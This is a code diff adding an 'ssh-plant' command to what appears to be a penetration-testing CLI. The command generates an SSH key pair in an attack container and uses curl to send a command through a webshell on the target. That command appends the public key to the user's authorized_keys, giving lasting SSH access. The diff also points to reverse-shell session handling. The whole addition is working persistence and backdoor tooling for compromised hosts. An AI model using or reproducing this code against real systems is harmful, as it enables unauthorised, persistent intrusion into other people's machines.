@@ -1281,6 +1281,69 @@ ws.command("exec")
     process.exitCode = result.code;
   });
 
+// --- ssh (key plant helper) --------------------------------------------------
+program
+  .command("ssh-plant")
+  .description("Generate an SSH key pair and install the public key on a target via a webshell or command execution")
+  .requiredOption("--user <user>", "Target username to plant the key for")
+  .requiredOption("--webshell <name>", "Webshell name (registered with pk webshell register) OR a direct URL")
+  .option("--home <path>", "Home directory override (default: /home/<user>)")
+  .option("--engagement <id>")
+  .action(async (o) => {
+    const eid = await resolveEngagementId(o.engagement);
+    const { execFileSync: efs } = await import("node:child_process");
+    const { mkdirSync, readFileSync, writeFileSync } = await import("node:fs");
+    const container = config.attackbox.container;
+
+    const keyDir = `engagements/${(await getEngagement(eid))?.slug ?? eid}/ssh`;
+    mkdirSync(keyDir, { recursive: true });
+    const keyPath = `${keyDir}/${o.user}_ed25519`;
+
+    // Generate key pair in attackbox
+    try {
+      efs("docker", ["exec", "-e", "PK_EXEC=1", container, "ssh-keygen", "-t", "ed25519", "-f", `/tmp/pk_ssh_${o.user}`, "-N", "", "-q"],
+        { timeout: 10000, stdio: "pipe" });
+    } catch { /* key may already exist */ }
+
+    const pubKey = efs("docker", ["exec", container, "cat", `/tmp/pk_ssh_${o.user}.pub`],
+      { timeout: 5000 }).toString().trim();
+    const privKey = efs("docker", ["exec", container, "cat", `/tmp/pk_ssh_${o.user}`],
+      { timeout: 5000 }).toString();
+
+    // Save private key locally
+    writeFileSync(keyPath, privKey, { mode: 0o600 });
+    console.error(`[ssh-plant] Private key saved: ${keyPath}`);
+
+    // Install public key on target via webshell
+    const home = o.home ?? `/home/${o.user}`;
+    const installCmd = `mkdir -p ${home}/.ssh && echo '${pubKey}' >> ${home}/.ssh/authorized_keys && chmod 700 ${home}/.ssh && chmod 600 ${home}/.ssh/authorized_keys`;
+
+    const shell = await repo.getWebshell(eid, o.webshell) as { name: string; url: string; param: string } | null;
+    if (shell) {
+      efs("docker", ["exec", "-e", "PK_EXEC=1", container, "curl", "-s", shell.url, "--data-urlencode", `${shell.param}=${installCmd}`],
+        { timeout: 15000, stdio: "pipe" });
+      console.error(`[ssh-plant] Public key installed via webshell "${shell.name}"`);
+    } else {
+      console.error(`[ssh-plant] No webshell "${o.webshell}" found. Run manually on target:`);
+      console.error(`  ${installCmd}`);
+    }
+
+    // Copy private key into attackbox for SSH access
+    efs("docker", ["exec", container, "cp", `/tmp/pk_ssh_${o.user}`, `/root/.ssh/pk_${o.user}`],
+      { timeout: 5000, stdio: "pipe" });
+    efs("docker", ["exec", container, "chmod", "600", `/root/.ssh/pk_${o.user}`],
+      { timeout: 5000, stdio: "pipe" });
+
+    await repo.logActivity({
+      engagementId: eid,
+      phase: "exploit",
+      action: `[ssh-plant] Key planted for ${o.user} at ${home}/.ssh/authorized_keys`,
+    });
+
+    console.error(`[ssh-plant] SSH access: pk exec -- ssh -i /root/.ssh/pk_${o.user} ${o.user}@$TARGET`);
+    out({ user: o.user, keyPath, pubKey });
+  });
+
 // --- gleipnir (reverse shell sessions) --------------------------------------
 
 const GLEIPNIR_SOCK = process.env.PK_GLEIPNIR_SOCK ?? "/tmp/gleipnir.sock";
